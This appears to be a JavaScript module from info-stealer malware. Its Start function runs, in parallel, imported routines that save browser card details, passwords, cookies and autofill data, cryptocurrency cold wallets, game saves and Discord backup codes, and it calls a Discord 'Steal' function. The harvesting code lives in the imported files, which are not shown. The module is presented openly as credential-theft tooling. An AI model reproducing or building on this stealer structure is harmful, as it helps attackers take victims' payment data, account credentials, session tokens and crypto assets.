const CardsCredentials = require("./order/CardsCred");
const PasswordsCredentials = require("./order/PasswordsCred");
const CookiesCredentials = require("./order/CookiesCred");
const AutofillsCredentials = require("./order/AutoFillsCred");
const Colds = require("../../functions/wallets/Colds");
const Games = require("../../functions/Games/Save");
const BackupCodes = require("../../functions/files/BackupCodes");
const Discord = require("../../functions/Social/Discord");

async function Start() {
  await Promise.all([
    CardsCredentials.Save(),
    PasswordsCredentials.Save(),
    CookiesCredentials.Save(),
    AutofillsCredentials.Save(),
    Colds.Save(),
    Games.Save(),
    BackupCodes.SearchDiscordCodes(),
    Discord.Steal()
  ]);
}

module.exports = { Start };
